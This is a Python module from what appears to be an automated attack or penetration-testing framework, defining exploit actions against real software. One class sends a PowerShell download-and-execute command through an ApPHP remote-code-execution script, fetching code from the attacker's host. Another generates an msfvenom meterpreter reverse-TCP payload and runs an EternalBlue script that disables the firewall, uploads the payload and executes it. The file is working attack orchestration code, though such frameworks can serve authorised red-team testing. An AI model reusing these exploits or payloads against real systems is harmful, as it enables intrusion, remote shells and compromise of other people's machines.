import os
import time
from lib.Common.Exploration.Actions.BaseAction import BaseAction
from lib.Common.Exploration.Environment.Observation import ProcessedObservation
import lib.Common.Utils.Log as Log
import lib.Common.Exploration.Actions as Actions

def create_initial_meterpreter_listener(lhost, lport):
    # SET UP FILESERVER AND LISTENER
    action_func = Actions.client.get_action("NETWORK", "metasploitlistener")
    action_options = {
        "LHOST": lhost,
        "LPORT": lport,
    }

    # TEC-441 This returns a process observation, we need to transform it to a raw observation?
    raw_observation = action_func.execute(action_options)

    return raw_observation


def create_initial_fileserver_and_meterpreter_listener(lhost, lport, srvport, uripath):
    action_func = Actions.client.get_action("NETWORK", "fileserver_and_metasploitlistener")
    action_options = {
        "LHOST":   lhost,
        "LPORT":   lport,
        "SRVPORT": srvport,
        "URIPATH": uripath,
        "TARGET": 5,  # powershell
        "DELAY_TO_OBSERVE": 0,
    }

    # TEC-441  This returns a process observation, we need to transform it to a raw observation?
    raw_observation = action_func.execute(action_options)

    return raw_observation


class APPhpRCE(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "exploit"

    def get_script_path(self):
        return "/tools/exploits/web/33070_aphp_drako.py"

    def execute(self, options):
        # GET OPTIONS
        lhost   = self.get_option(options, "lhost")
        lport   = self.get_option(options, "lport")
        rhost   = self.get_option(options, "rhost")
        srvport = self.get_option(options, "srvport")
        uripath = self.get_option(options, "uripath")
        delay_to_observe = self.get_option(options, "delay_to_observe")

        raw_observations = []

        start_time = time.time()

        # SET UP FILESERVER AND LISTENER
        raw_observation_fs_and_listener = create_initial_fileserver_and_meterpreter_listener(lhost, lport, srvport,
                                                                                             uripath)
        raw_observations.append(raw_observation_fs_and_listener)

        # RUN COMMAND TO DOWNLOAD AND RUN FROM OUR WEBSERVER A POWERSHELL THAT DOWNLOADS AND RUNS A FILE IN OUR FILESERVER
        command = r'powershell.exe -exec Bypass -c "IEX(New-Object Net.WebClient).downloadString(\"http://' + lhost + ":" + lport + '/drako/download_from_fileserver_and_run.ps1\")"'
        command_arr = ["python2", "/tools/exploits/web/apphp_33070_single_exec.py", "http://%s/" % rhost, command]
        command_str = " ".join(command_arr)

        raw_observations_run_command = self.environment.run_local_command(self.action_name, self.action_type,
                                                                          delay_to_observe, command_arr)
        raw_observations.append(raw_observations_run_command)

        if raw_observations_run_command.observed_error is None:
            processed_observation = self.create_observation(raw_observations_run_command.observed_output,
                                                            raw_observations, time.time() - start_time)

            return processed_observation
        else:
            error = raw_observations_run_command.observed_error

            return ProcessedObservation(self.action_name, "", None,
                                        "ERROR EXECUTING COMMAND %s: %s" % (command_str, error))

    def create_observation(self, message, raw_observations, time_taken):
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=time_taken,
                                                                            raw_observations=raw_observations)

        return processed_observation

    def get_options(self):
        return {
            "RHOST": {
                "required": "yes",
                "type": "address",
                "description": "target for exploit",
            },
            "RPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port for exploit",
            },
            "LHOST": {
                "required": "yes",
                "type": "address",
                "description": "local address",
            },
            "LPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "local port",
            },
            "URIPATH": {
                "required": "yes",
                "type": "string",
                "description": "filename to use",
            },
            "SRVPORT": {
                "required": "no",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port for file server to listen at",
            },
            "DELAY_TO_OBSERVE": {
                "required": "yes",
                "type": "int",
                "description": "delay after observation",
            },
        }


# DEPRECATED SINCE IT USES PYTHON2
class EternalBlueExploit(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "exploit"

    def get_script_path(self):
        return "/tools/exploits/eternalblue/zzz_exploit_eternal.py"

    def _create_msfvenom_payload(self, lhost, lport, operatingsystem="windows", architecture="x64"):
        if operatingsystem == "windows" and architecture == "x64":
            command = "msfvenom -p windows/%s/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f exe SessionCommunicationTimeout=600 SessionRetryTotal=120 SessionRetryWait=5 PingbackRetries=10 PingbackSleep=5 EXITFUNC=thread -o /tmp/msfvenom_shell.exe" % (
            architecture, lhost, lport)
            os.system(command)
            Log.logger.debug("Running command: %s" % command)
            Log.logger.info("Created msfvenom payload in /tmp/msfvenom_shell.exe")
        else:
            raise ValueError("Cannot create msfvenom payload for os=%s and architecture=%s" % (os, architecture))

    def execute(self, options):
        # GET OPTIONS
        lhost = self.get_option(options, "lhost")
        lport = self.get_option(options, "lport")
        delay_to_observe = self.get_option(options, "delay_to_observe")

        start_time       = time.time()
        raw_observations = []
        raw_observation_listener = create_initial_meterpreter_listener(lhost, lport)
        raw_observations.append(raw_observation_listener)

        # CREATE MSFVENOM PAYALODS
        self._create_msfvenom_payload(lhost, lport)

        rhost      = self.get_option(options, "rhost")
        disable_fw = self.get_option(options, "disable_fw")

        command_arr = ['python2', self.get_script_path(), rhost, 'disable_fw_upload_and_execute',
                       "/tmp/msfvenom_shell.exe", "C", "/msfvenom_shell.exe"]
        command_str = " ".join(command_arr)
        Log.logger.debug(command_str)

        raw_observations_run_command = self.environment.run_local_command(self.action_name, self.action_type,
                                                                          delay_to_observe, command_arr)
        raw_observations.append(raw_observations_run_command)

        if raw_observations_run_command.observed_error is None:
            output = raw_observations_run_command.observed_output

            processed_observation = self.create_observation(raw_observations_run_command.observed_output,
                                                            raw_observations, time.time() - start_time)

            return processed_observation
        else:
            error = raw_observations_run_command.observed_error

            error_msg = "ERROR EXECUTING COMMAND %s: %s" % (command_str, error)
            Log.logger.error(error_msg)
            return ProcessedObservation(self.action_name, error_msg, 0, None, error_msg)

    def create_observation(self, message, raw_observations, time_taken):
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=time_taken,
                                                                            raw_observations=raw_observations)

        return processed_observation

    def get_options(self):
        return {
            "RHOST": {
                "required": "yes",
                "type": "address",
                "description": "target for exploit",
            },
            "RPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port for exploit",
            },
            "DISABLE_FW": {
                "default": "yes",
                "required": "no",
                "type": "bool",
                "description": "first disable windows firewall",
            },
            "DELAY_TO_OBSERVE": {
                "required": "yes",
                "type": "int",
                "description": "delay after observation",
            },
        }
